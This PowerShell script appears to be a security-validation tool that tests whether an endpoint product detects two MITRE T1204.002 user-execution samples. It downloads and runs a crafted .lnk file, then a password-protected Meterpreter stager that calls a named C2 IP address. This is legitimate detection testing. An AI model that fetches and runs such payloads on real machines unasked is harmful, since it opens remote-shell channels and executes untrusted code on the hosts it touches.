# Function to display the logo
function Show-Logo {
    Write-Host @"                                                                           
                                                                                                @@@      
                                                                                             @@@ @ @@@@  
                                                                                           @@@ @ @@@ @   
                                                                                        @@@@ @@@@ @  @@@ 
                                                                                     /@@@ @@@@  @@@@@ @  
                                                                                  #@@. @@@@ @@@@@ &@     
                                                                               @@@@@@@@  @@@   @@@@@@&   
                                                                            @@@@@@@@@@@@  @@@@@@ @@      
                                                                         @@@@@@@@@@@@@@@@   @@@@@@       
                                                                      @@@@@@@@@@@@@ %@@@@@   @@          
                                                  @@               @@@@    @@@@@@@@   @@@@@@@.@          
                                             @@@@ @@@@          @@@@       @@@@@@@@      @@              
                                          @@@     @@@@@@      @@@@       @@@@@@@@@@@@  @                 
                                       @@@@            @@@   @@@       @@@@@@@@@@@@@@ @                  
                                       @@               @@@ @@@       @@@@@@@  @@@@                      
                                        @@              @@@@@@      @@@@@@@@@@  @@                       
                                         @@              @@@@      @@@@@@@@@@@@                          
                                          @(          /@@@        @@@@@    @                             
                                          @@       @@@@          @@@@@@@@ @                              
                                          @ @@@@@@@#             /@@@@@@@                                
                                        @@@@@@@                    @@@@ @                                
                                      @  @@@@@                       @@@@                                
                                    @  @@@@             @@/            @@@@@@                            
                                   @ %@@ @@  @@@@@@@@,   @@         ,@@@@@@@@@@@@@@@@@@@@@@@@@@@         
                                    @ @@         @@@@@  @@@@@@@@@@@  ,@@@@@@@@@@@@,@@% ,@@@@@@@          
                                     @           @@@@@ @@                  &@@& @@  @@@@@@               
                                                @@@@@@@*                                                 
                                               @@@ @@                                                    
                                            @@   @                                                       
    TRIFIDENT                           @@ @@@@@                                                         
Security Validation Tests v0.1              @                       
"@
}

function Get-OSType {
    $unameOutput = $(uname -s)

    if ($unameOutput -eq "Darwin") {
        $os = "macOS"
        $color = "Yellow"
    } elseif ($unameOutput -eq "Linux") {
        $os = "Linux"
        $color = "Green"
    } elseif ($unameOutput -eq "WindowsNT" -or $unameOutput -eq "MINGW32_NT-10.0" -or $unameOutput -eq "MINGW64_NT-10.0") {
        $os = "Windows"
        $color = "Cyan"
    } else {
        $os = "Unknown"
        $color = "Red"
    }

    # Print the operating system with color and bold style
    Write-Host -NoNewline "Operating System: " -ForegroundColor $color -BackgroundColor Black
    Write-Host -NoNewline "$os" -ForegroundColor $color -BackgroundColor Black
    Write-Host " (Selecting appropriate tests)"
}






# Function to run commands
function Run-AtomicTest1-Windows {
    Write-Host "
    Test 1: T1204.002 : User Execution: Defanged malicious .lnk file
    ------------------------------------
    
    LNK files are based on the Shell Link Binary file format, also known as Windows
    shortcuts. But what seems a relatively simple ability to execute other binaries 
    on the    system can inflict great harm when abused by threat actors. Microsoft’s 
    decision to block macros by default for files downloaded from the internet in Office 
    applications provoked malware developers to shift to other techniques.
    
    This test downloads a crafted .lnk file from Atomic RedTeam's github repository, and then attempts to execute it. 
    When executed, the .lnk file attempts to download a clean copy of Putty (a windows based ssh client) as 'a.exe' 
    and attempts to execute it.

    Expected Outcome: SentinelOne detects, alerts, and quarantines the LNK file, however
    Putty still executes.
    
    "
    
    # First URL to download
    $firstUrl = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
    
    # Second URL to download (provide your own URL)
    $secondUrl = "YOUR_SECOND_URL_HERE"

    $confirmation = Read-Host "Do you want to proceed with T1204.002 : User Execution: Defanged malicious .lnk file? (Y/N)"
    if ($confirmation -ne "Y") {
            Write-Host "Exiting script..."
            return
        }
    
    try {
        # Try downloading the file from the first URL
        Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $firstUrl -ErrorAction Stop
        Write-Host "File downloaded successfully from $firstUrl"
    }
    catch {
        # If an error occurs, display the error message
        Write-Host "Error downloading file from $($firstUrl): $_"
        Write-Host "Trying second URL..."
        
        try {
            # Try downloading the file from the second URL
            Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $secondUrl -ErrorAction Stop
            Write-Host "File downloaded successfully from $secondUrl"
        }
        catch {
            # If an error occurs again, display the error message and exit
            Write-Host "Error downloading file from $($secondUrl): $_"
            Write-Host "Failed to download the file from both URLs. Updating log information"
            return
        }
    }

    # The test file has been saved to $temp\test10.lnk
    $file1 = "$tempDirectory\test10.lnk"

    # Execute the downloaded file
    Start-Process $file1

    # Wait for 10 seconds
    Start-Sleep -Seconds 10

    # Kill the process named "a.exe"
    taskkill /IM a.exe /F

    # Removing all downloaded or created files
    $file1 = "$tempDirectory\test10.lnk"
    $file2 = "$tempDirectory\a.exe"
    Remove-Item $file1 -ErrorAction Ignore
    Remove-Item $file2 -ErrorAction Ignore
}

function Run-AtomicTest2-Windows {
    Write-Host "
    Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter
    ------------------------------------
    
    Meterpreter is a Metasploit attack payload that provides an interactive shell to the
    attacker from which to explore the target machine and execute code. Meterpreter is
    deployed using in-memory DLL injection. As a result, Meterpreter resides entirely in
    memory and writes nothing to disk. It communicates over the stager socket and provides
    a comprehensive client-side Ruby API. It features command history, tab completion,
    channels, and more.

    Shell.exe attempts to shovel a meterpreter shell from the host machine to a Trifident
    owned C2 server over HTTP (port 9191) located in Azure at the IP address of
    172.174.245.183. The C2 meterpreter listener is disabled by default on our C2 server. If
    execution succeeds, the C2 channel will not be established. 
    
    If you would like to validate the C2 server is non-operational prior to execution, 
    you can perform the following test:
    
        nmap -p 9191 172.174.245.183
    
    *Note: Other ports may be open as this C2 server is used for multiple engagements.

    Expected Outcome: SentinelOne detects, alerts, and quarantines shell.exe without execution.
    
    "
    
    # First URL to download
    $firstUrl = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/payloads/shell-trifident.zip"
    
    # Second URL to download (provide your own URL)
    $secondUrl = "YOUR_SECOND_URL_HERE"

    $confirmation = Read-Host "Do you want to proceed with Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter? (Y/N)"
    if ($confirmation -ne "Y") {
            Write-Host "Exiting script..."
            return
        }
    
    try {
        # Try downloading the file from the first URL
        Invoke-WebRequest -OutFile $tempDirectory\shell-trifident.zip $firstUrl -ErrorAction Stop
        Write-Host "File downloaded successfully from $firstUrl"
    }
    catch {
        # If an error occurs, display the error message
        Write-Host "Error downloading file from $($firstUrl): $_"
        Write-Host "Trying second URL..."
        
        try {
            # Try downloading the file from the second URL
            Invoke-WebRequest -OutFile $tempDirectory\shell-trifident.zip $secondUrl -ErrorAction Stop
            Write-Host "File downloaded successfully from $secondUrl"
        }
        catch {
            # If an error occurs again, display the error message and exit
            Write-Host "Error downloading file from $($secondUrl): $_"
            Write-Host "Failed to download the file from both URLs. Updating log information"
            #return
        }
    }

    # The zip file is password protected, we need 7zip to unpack it. If 7zip is not currently installed
    # This script will remove it in the clean up section. (It will leave it if already installed)

    # Check if 7Zip4Powershell module is installed
    if (-not (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
        # If not installed, install the module
        Install-Module -Name 7Zip4Powershell -Force
        $Installed7Zip = $true
    } else {
        Write-Host "7Zip4Powershell module is already installed."
        $Installed7Zip = $false
    }

    # If the module was installed or already installed, proceed with unzipping the file
    if ($Installed7Zip -or (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
        $zipFile = "$tempDirectory/shell-trifident.zip"
        $destination = $tempDirectory
        $password = "trifident"
        
        # Unzip the file using 7Zip4Powershell
        Expand-7Zip -ArchiveFileName $zipFile -Password $password -TargetPath $destination
    } else {
        Write-Host "Unable to unzip the file because the 7Zip4Powershell module is not available."
    }
    
    # The test file has been saved to $temp\shell.exe
    $file1 = "$tempDirectory/shell.exe"
    # Execute the downloaded file
    Start-Process $file1

    # Wait for 10 seconds
    Start-Sleep -Seconds 10

    # Kill the process named "a.exe"
    taskkill /IM shell.exe /F

    # Removing all downloaded or created files
    $file1 = "$tempDirectory\shell-trifident.zip"
    $file2 = "$tempDirectory\shell.exe"
    Remove-Item $file1 -ErrorAction Ignore
    Remove-Item $file2 -ErrorAction Ignore

}

# Call the function to display the logo and begin tests
Show-Logo
Get-OSType
# Get the temporary directory path
$tempDirectory = [System.IO.Path]::GetTempPath()
Run-AtomicTest1-Windows
Run-AtomicTest2-Windows
